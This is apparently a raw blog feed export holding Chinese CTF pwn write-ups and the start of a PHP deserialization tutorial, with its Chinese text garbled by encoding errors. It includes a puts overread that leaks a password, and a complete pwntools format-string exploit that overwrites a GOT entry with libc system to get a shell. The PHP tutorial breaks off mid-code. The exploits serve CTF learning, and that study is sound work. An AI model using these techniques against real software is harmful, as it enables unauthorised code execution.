class="string">&quot;r&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !stream )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(</span><br><span class="line">      <span class="string">&quot;Password File is Missing. Problem is Misconfigured, please contact an Admin if you are running this on the shell server.&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  fgets(password, <span class="number">64</span>, stream);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Hello &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(name);</span><br><span class="line">  fgets(input, <span class="number">64</span>, <span class="built_in">stdin</span>);</span><br><span class="line">  name[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(input, password) )</span><br><span class="line">    flag();</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Incorrect Password!&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¦‚æœè¾“å…¥çš„inputå’Œè¿œç¨‹æ–‡ä»¶çš„pwdå†…å®¹ç›¸åŒï¼Œå°±ä¼šè¾“å‡ºflagã€‚</p><p>å¯ä»¥çœ‹åˆ°nameä¸pwdåœ¨æ ˆä¸Šæ­£å¥½å·®0x100ï¼Œè€Œputsé‡åˆ°\x00æ‰ç»“æŸã€‚æ‰€ä»¥å¯ä»¥å…ˆæ³„éœ²ä¸‹pwdï¼š</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">gwt@ubuntu:~/Desktop$ nc node4.buuoj.cn 27601</span><br><span class="line">What is your name?</span><br><span class="line">aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa</span><br><span class="line">Hello aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa,a_reAllY_s3cuRe_p4s<span class="variable">$word_f85406</span></span><br><span class="line"></span><br><span class="line">Incorrect Password!</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>æˆåŠŸæ‹¿åˆ°pwd</p><p>expï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">io = remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>,<span class="number">27601</span>)</span><br><span class="line">pwd = <span class="string">&#x27;a_reAllY_s3cuRe_p4s$word_f85406&#x27;</span></span><br><span class="line">io.recv()</span><br><span class="line">io.sendline(<span class="string">&#x27;aaa&#x27;</span>)</span><br><span class="line">io.recv()</span><br><span class="line">io.sendline(pwd)</span><br><span class="line">io.recv()</span><br></pre></td></tr></table></figure><h1 id="0x4F-axb-2019-fmt64"><a href="#0x4F-axb-2019-fmt64" class="headerlink" title="0x4F.axb_2019_fmt64"></a>0x4F.axb_2019_fmt64</h1><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl __noreturn <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> s[<span class="number">272</span>]; <span class="comment">// [rsp+10h] [rbp-250h] BYREF</span></span><br><span class="line">  <span class="keyword">char</span> format[<span class="number">312</span>]; <span class="comment">// [rsp+120h] [rbp-140h] BYREF</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v5; <span class="comment">// [rsp+258h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v5 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  setbuf(<span class="built_in">stdout</span>, <span class="number">0LL</span>);</span><br><span class="line">  setbuf(<span class="built_in">stdin</span>, <span class="number">0LL</span>);</span><br><span class="line">  setbuf(<span class="built_in">stderr</span>, <span class="number">0LL</span>);</span><br><span class="line">  <span class="built_in">puts</span>(</span><br><span class="line">    <span class="string">&quot;Hello,I am a computer Repeater updated.\n&quot;</span></span><br><span class="line">    <span class="string">&quot;After a lot of machine learning,I know that the essence of man is a reread machine!&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;So I&#x27;ll answer whatever you say!&quot;</span>);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    alarm(<span class="number">3u</span>);</span><br><span class="line">    <span class="built_in">memset</span>(s, <span class="number">0</span>, <span class="number">0x101</span>uLL);</span><br><span class="line">    <span class="built_in">memset</span>(format, <span class="number">0</span>, <span class="number">0x12C</span>uLL);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Please tell me:&quot;</span>);</span><br><span class="line">    read(<span class="number">0</span>, s, <span class="number">0x100</span>uLL);</span><br><span class="line">    <span class="built_in">sprintf</span>(format, <span class="string">&quot;Repeater:%s\n&quot;</span>, s);</span><br><span class="line">    <span class="keyword">if</span> ( <span class="built_in">strlen</span>(format) &gt; <span class="number">0x10E</span> )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="built_in">printf</span>(format);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;what you input is really long!&quot;</span>);</span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">gwt@ubuntu:~/Desktop$ ./axb_2019_fmt64 </span><br><span class="line">Hello,I am a computer Repeater updated.</span><br><span class="line">After a lot of machine learning,I know that the essence of man is a reread machine!</span><br><span class="line">So I<span class="string">&#x27;ll answer whatever you say!</span></span><br><span class="line"><span class="string">Please tell me:aaaa%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.</span></span><br><span class="line"><span class="string">Repeater:aaaa0.25.0.ffe0.45.9.945f82b0.61616161.78252e78.252e7825.2e78252e.78252e78.252e7825.2e78252e.a2e78.0.0.0</span></span><br></pre></td></tr></table></figure><p>åç§»æ˜¯ç¬¬å…«ä¸ªï¼Œä½†æ˜¯<code>elf.got[&#39;puts&#39;]+%8$s</code>è¿™æ ·æ„é€ æ˜¯ä¸è¡Œçš„ï¼Œå› ä¸º00æˆªæ–­çš„ç¼˜æ•…ï¼Œæ‰€ä»¥ï¼š</p><p><code>&quot;%9$sAAAA&quot; + p64(elf.got[&#39;puts&#39;])</code></p><p>%næ˜¯4å­—èŠ‚ï¼Œ%hnæ˜¯2å­—èŠ‚ï¼Œhhnæ˜¯1å­—èŠ‚.</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€[ STACK ]â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€</span><br><span class="line">00:0000â”‚ rsp  0x7ffcd3616f60 â—‚â€” 9 /* <span class="string">&#x27;\t&#x27;</span> */</span><br><span class="line">01:0008â”‚      0x7ffcd3616f68 â—‚â€” 0x15d36e42b0</span><br><span class="line">02:0010â”‚ rsi  0x7ffcd3616f70 â—‚â€” 0x3231256338393125 (<span class="string">&#x27;%198c%12&#x27;</span>)<span class="comment">#offset 8</span></span><br><span class="line">03:0018â”‚      0x7ffcd3616f78 â—‚â€” 0x313834256e686824 (<span class="string">&#x27;$hhn%481&#x27;</span>)</span><br><span class="line">04:0020â”‚      0x7ffcd3616f80 â—‚â€” 0x6e68243331256337 (<span class="string">&#x27;7c%13$hn&#x27;</span>)</span><br><span class="line">05:0028â”‚      0x7ffcd3616f88 â—‚â€” 0x4141414141414141 (<span class="string">&#x27;AAAAAAAA&#x27;</span>)</span><br><span class="line">06:0030â”‚      0x7ffcd3616f90 â€”â–¸ 0x601022 (_GLOBAL_OFFSET_TABLE_+34) â—‚â€” 0x26c000007f9395d3</span><br><span class="line">07:0038â”‚      0x7ffcd3616f98 â€”â–¸ 0x601020 (_GLOBAL_OFFSET_TABLE_+32) â€”â–¸ 0x7f9395d377a0 (strlen) â—‚â€” pxor   xmm0, xmm0</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment"># context(log_level=&#x27;debug&#x27;)</span></span><br><span class="line">io = remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>,<span class="number">29175</span>)</span><br><span class="line"><span class="comment"># io = process(&quot;./axb_2019_fmt64&quot;)</span></span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&quot;./axb_2019_fmt64&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;./libc-x64-2.23.so&quot;</span>)</span><br><span class="line"><span class="comment"># libc = ELF(&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;)</span></span><br><span class="line"></span><br><span class="line">io.recv()</span><br><span class="line">payload = <span class="string">&quot;%9$sAAAA&quot;</span> + p64(elf.got[<span class="string">&#x27;read&#x27;</span>])</span><br><span class="line">io.sendline(payload)</span><br><span class="line"><span class="comment"># gdb.attach(io)</span></span><br><span class="line">io.recvuntil(<span class="string">&#x27;Repeater:&#x27;</span>)</span><br><span class="line">read_got = u64(io.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">base =  read_got - libc.sym[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">system_addr = base + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"></span><br><span class="line">high_sys = (system_addr &gt;&gt; <span class="number">16</span>) &amp; <span class="number">0xff</span></span><br><span class="line">low_sys = system_addr &amp; <span class="number">0xffff</span></span><br><span class="line"><span class="comment">#è¿™é‡Œåªæ”¹äº†ä¸€éƒ¨åˆ†ï¼Œå…¶ä»–çš„ä½æ˜¯ä¸€æ ·çš„</span></span><br><span class="line">payload = <span class="string">&quot;%&quot;</span> + <span class="built_in">str</span>(high_sys - <span class="number">9</span>) + <span class="string">&quot;c%12$hhn&quot;</span> + <span class="string">&quot;%&quot;</span> + <span class="built_in">str</span>(low_sys - high_sys) + <span class="string">&quot;c%13$hn&quot;</span></span><br><span class="line">payload = payload.ljust(<span class="number">32</span>,<span class="string">&quot;A&quot;</span>) + p64(elf.got[<span class="string">&#x27;strlen&#x27;</span>]+<span class="number">2</span>)+p64(elf.got[<span class="string">&#x27;strlen&#x27;</span>])</span><br><span class="line"></span><br><span class="line">io.sendafter(<span class="string">&quot;Please tell me:&quot;</span>,payload) </span><br><span class="line">io.sendafter(<span class="string">&quot;Please tell me:&quot;</span>,<span class="string">&#x27;;/bin/sh\x00&#x27;</span>) </span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;[TOC]&lt;/p&gt;
&lt;h1 id=&quot;0x40-ciscn-2019-s-9&quot;&gt;&lt;a href=&quot;#0x40-ciscn-2019-s-9&quot; class=&quot;headerlink&quot; title=&quot;0x40.ciscn_2019_s_9&quot;&gt;&lt;/a&gt;0x40.ciscn_2019_</summary>
      
    
    
    
    
    <category term="PWN" scheme="http://example.com/tags/PWN/"/>
    
  </entry>
  
  <entry>
    <title>PHPååºåˆ—åŒ–æ•´ç†</title>
    <link href="http://example.com/2021/10/05/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%95%B4%E7%90%86/"/>
    <id>http://example.com/2021/10/05/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%95%B4%E7%90%86/</id>
    <published>2021-10-04T16:00:00.000Z</published>
    <updated>2021-10-23T04:36:21.306Z</updated>
    
    <content type="html"><![CDATA[<p>[toc]</p><h1 id="1-ååºåˆ—åŒ–"><a href="#1-ååºåˆ—åŒ–" class="headerlink" title="1.ååºåˆ—åŒ–"></a>1.ååºåˆ—åŒ–</h1><p>Demo:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">test</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$flag</span> = <span class="string">&quot;flag&#123;233&#125;&quot;</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$ccc</span> = <span class="string">&quot;ccc&quot;</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$a</span> = <span class="string">&quot;aaa&quot;</span>;</span><br><span class="line">        <span class="built_in">static</span> <span class="variable">$b</span> = <span class="string">&quot;bbb&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$test</span> = <span class="keyword">new</span> test;</span><br><span class="line">    <span class="variable">$data</span> = serialize(<span class="variable">$test</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$data</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">    out:</span><br><span class="line">O:<span class="number">4</span>:<span class="string">&quot;test&quot;</span>:<span class="number">3</span>:&#123;s:<span class="number">10</span>:<span class="string">&quot;testflag&quot;</span>;s:<span class="number">9</span>:<span class="string">&quot;flag&#123;233&#125;&quot;</span>;s:<span class="number">6</span>:<span class="string">&quot;*ccc&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;ccc&quot;</span>;s:<span class="number">1</span>:<span class="string">&quot;a&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;aaa&quot;</span>;&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>æ³¨æ„è¿™é‡Œtestflagé•¿åº¦ä¸º8ï¼Œä½†åºåˆ—åŒ–çš„æ˜¾ç¤ºç¡®æ˜¯10ï¼Œå¯ä»¥æŠ“åŒ…ä¸€ä¸‹ï¼š</p><p><img src="/2021/10/05/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%95%B4%E7%90%86/image-20211005134208833.png" alt="image-20211005134208833"></p><p>å¯ä»¥çœ‹åˆ°å…¶å®ç±»åçš„å‰åæœ‰ä¸å¯è§å­—ç¬¦ï¼Œå…¶å®å°±æ˜¯%00ï¼Œè¿™æ˜¯å› ä¸ºflagæ˜¯privateï¼Œæ‰€ä»¥åœ¨ä¼ å…¥åºåˆ—åŒ–å­—ç¬¦ä¸²è¿›è¡Œååºåˆ—åŒ–æ—¶éœ€è¦æ³¨æ„è¡¥é½ä¸¤ä¸ªç©ºå­—èŠ‚ã€‚ï¼ˆprotectedåŒç†ï¼‰</p><p>ååºåˆ—åŒ–ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">    <span class="variable">$str</span> = <span class="string">&#x27;O%3A4%3A%22test%22%3A2%3A%7Bs%3A10%3A%22%00test%00flag%22%3Bs%3A9%3A%22flag%7B233%7D%22%3Bs%3A1%3A%22a%22%3Bs%3A3%3A%22aaa%22%3B%7D&#x27;</span>;</span><br><span class="line">    <span class="variable">$data</span> = urldecode(<span class="variable">$str</span>);</span><br><span class="line">    <span class="variable">$obj</span> = unserialize(<span class="variable">$data</span>);</span><br><span class="line"></span><br><span class="line">    var_dump(<span class="variable">$obj</span>);</span><br><span class="line"> <span class="meta">?&gt;</span></span><br><span class="line">     out:</span><br><span class="line"><span class="keyword">object</span>(<span class="built_in">__PHP_Incomplete_Class</span>)<span class="comment">#1 (3) &#123; </span></span><br><span class="line">    [<span class="string">&quot;__PHP_Incomplete_Class_Name&quot;</span>]=&gt; <span class="keyword">string</span>(<span class="number">4</span>) <span class="string">&quot;test&quot;</span> </span><br><span class="line">    [<span class="string">&quot;flag:private&quot;</span>]=&gt; <span class="keyword">string</span>(<span class="number">9</span>) <span class="string">&quot;flag&#123;233&#125;&quot;</span> </span><br><span class="line">    [<span class="string">&quot;a&quot;</span>]=&gt; <span class="keyword">string</span>(<span class="number">3</span>) <span class="string">&quot;aaa&quot;</span> &#125; </span><br></pre></td></tr></table></figure><h2 id="1-é­”æœ¯æ–¹æ³•"><a href="#1-é­”æœ¯æ–¹æ³•" class="headerlink" title="1.é­”æœ¯æ–¹æ³•"></a>1.é­”æœ¯æ–¹æ³•</h2><p>å¸¸è§é­”æœ¯æ–¹æ³•ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">__construct()<span class="comment">//åˆ›å»ºå¯¹è±¡æ—¶è§¦å‘</span></span><br><span class="line">__destruct() <span class="comment">//å¯¹è±¡è¢«é”€æ¯æ—¶è§¦å‘</span></span><br><span class="line">__call() <span class="comment">//åœ¨å¯¹è±¡ä¸Šä¸‹æ–‡ä¸­è°ƒç”¨ä¸å¯è®¿é—®çš„æ–¹æ³•æ—¶è§¦å‘</span></span><br><span class="line">__callStatic() <span class="comment">//åœ¨é™æ€ä¸Šä¸‹æ–‡ä¸­è°ƒç”¨ä¸å¯è®¿é—®çš„æ–¹æ³•æ—¶è§¦å‘</span></span><br><span class="line">__get() <span class="comment">//ç”¨äºä»ä¸å¯è®¿é—®çš„å±æ€§è¯»å–æ•°æ®</span></span><br><span class="line">__set() <span class="comment">//ç”¨äºå°†æ•°æ®å†™å…¥ä¸å¯è®¿é—®çš„å±æ€§</span></span><br><span class="line">__isset() <span class="comment">//åœ¨ä¸å¯è®¿é—®çš„å±æ€§ä¸Šè°ƒç”¨isset()æˆ–empty()è§¦å‘</span></span><br><span class="line">__unset() <span class="comment">//åœ¨ä¸å¯è®¿é—®çš„å±æ€§ä¸Šä½¿ç”¨unset()æ—¶è§¦å‘</span></span><br><span class="line">__invoke() <span class="comment">//å½“è„šæœ¬å°è¯•å°†å¯¹è±¡è°ƒç”¨ä¸ºå‡½æ•°æ—¶è§¦å‘</span></span><br><span class="line">__sleep()<span class="comment">//åœ¨å¯¹è±¡åœ¨è¢«åºåˆ—åŒ–ä¹‹å‰è¿è¡Œ</span></span><br><span class="line">__wakeup()<span class="comment">//å°†åœ¨ååºåˆ—åŒ–ä¹‹åç«‹å³è¢«è°ƒç”¨(é€šè¿‡åºåˆ—åŒ–å¯¹è±¡å…ƒç´ ä¸ªæ•°ä¸ç¬¦æ¥ç»•è¿‡)</span></span><br><span class="line">__toString() <span class="comment">//å½“ä¸€ä¸ªå¯¹è±¡è¢«å½“ä½œä¸€ä¸ªå­—ç¬¦ä¸²ä½¿ç”¨</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="sleep"><a href="#sleep" class="headerlink" title="__sleep()"></a>__sleep()</h3><blockquote><p>  serialize() å‡½æ•°ä¼šæ£€æŸ¥ç±»ä¸­æ˜¯å¦å­˜åœ¨ä¸€ä¸ªé­”æœ¯æ–¹æ³• __sleep()ã€‚å¦‚æœå­˜åœ¨ï¼Œ==è¯¥æ–¹æ³•ä¼šå…ˆè¢«è°ƒç”¨ï¼Œç„¶åæ‰æ‰§è¡Œåºåˆ—åŒ–æ“ä½œ==ã€‚æ­¤åŠŸèƒ½å¯ä»¥ç”¨äºæ¸…ç†å¯¹è±¡ï¼Œå¹¶è¿”å›ä¸€ä¸ªåŒ…å«å¯¹è±¡ä¸­æ‰€æœ‰åº”è¢«åºåˆ—åŒ–çš„å˜é‡åç§°çš„æ•°ç»„ã€‚å¦‚æœè¯¥æ–¹æ³•æœªè¿”å›ä»»ä½•å†…å®¹ï¼Œåˆ™ NULL è¢«åºåˆ—åŒ–ï¼Œå¹¶äº§ç”Ÿä¸€ä¸ª E_NOTICE çº§åˆ«çš„é”™è¯¯ã€‚</p></blockquote><p>å¯¹è±¡è¢«åºåˆ—åŒ–ä¹‹å‰è§¦å‘ï¼Œè¿”å›éœ€è¦è¢«åºåˆ—åŒ–å­˜å‚¨çš„æˆå‘˜å±æ€§ï¼Œåˆ é™¤ä¸å¿…è¦çš„å±æ€§ã€‚</p><h3 id="wakeup"><a href="#wakeup" class="headerlink" title="__wakeup()"></a>__wakeup()</h3><blockquote><p>  unserialize() ä¼šæ£€æŸ¥æ˜¯å¦å­˜åœ¨ä¸€ä¸ª __wakeup() æ–¹æ³•ã€‚å¦‚æœå­˜åœ¨ï¼Œåˆ™ä¼šå…ˆè°ƒç”¨ __wakeup æ–¹æ³•ï¼Œé¢„å…ˆå‡†å¤‡å¯¹è±¡éœ€è¦çš„èµ„æºã€‚</p></blockquote><p>é¢„å…ˆå‡†å¤‡å¯¹è±¡èµ„æºï¼Œè¿”å›voidï¼Œå¸¸ç”¨äºååºåˆ—åŒ–æ“ä½œä¸­é‡æ–°å»ºç«‹æ•°æ®åº“è¿æ¥æˆ–æ‰§è¡Œå…¶ä»–åˆå§‹åŒ–æ“ä½œã€‚</p><p>test:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Caiji</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$ID</span>, <span class="variable">$sex</span>, <span class="variable">$age</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;ID = <span class="variable">$ID</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;sex = <span class="variable">$sex</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;age = <span class="variable">$age</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;info = sprintf(<span class="string">&quot;ID: %s, age: %d, sex: %s&quot;</span>, <span class="keyword">$this</span>-&gt;ID, <span class="keyword">$this</span>-&gt;sex, <span class="keyword">$this</span>-&gt;age);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getInfo</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;info . <span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * serializeå‰è°ƒç”¨ ç”¨äºåˆ é€‰éœ€è¦è¢«åºåˆ—åŒ–å­˜å‚¨çš„æˆå‘˜å˜é‡</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> array [description]</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__sleep</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">__METHOD__</span> . <span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line">        <span class="keyword">return</span> [<span class="string">&#x27;ID&#x27;</span>, <span class="string">&#x27;sex&#x27;</span>, <span class="string">&#x27;age&#x27;</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * unserializeå‰è°ƒç”¨ ç”¨äºé¢„å…ˆå‡†å¤‡å¯¹è±¡èµ„æº</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">__METHOD__</span> . <span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;info = sprintf(<span class="string">&quot;ID: %s, age: %d, sex: %s&quot;</span>, <span class="keyword">$this</span>-&gt;ID, <span class="keyword">$this</span>-&gt;sex, <span class="keyword">$this</span>-&gt;age);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$me</span> = <span class="keyword">new</span> Caiji(<span class="string">&#x27;twosmi1e&#x27;</span>, <span class="number">20</span>, <span class="string">&#x27;male&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$me</span>-&gt;getInfo();</span><br><span class="line"><span class="comment">//å­˜åœ¨__sleep(å‡½æ•°ï¼Œ$infoå±æ€§ä¸ä¼šè¢«å­˜å‚¨</span></span><br><span class="line"><span 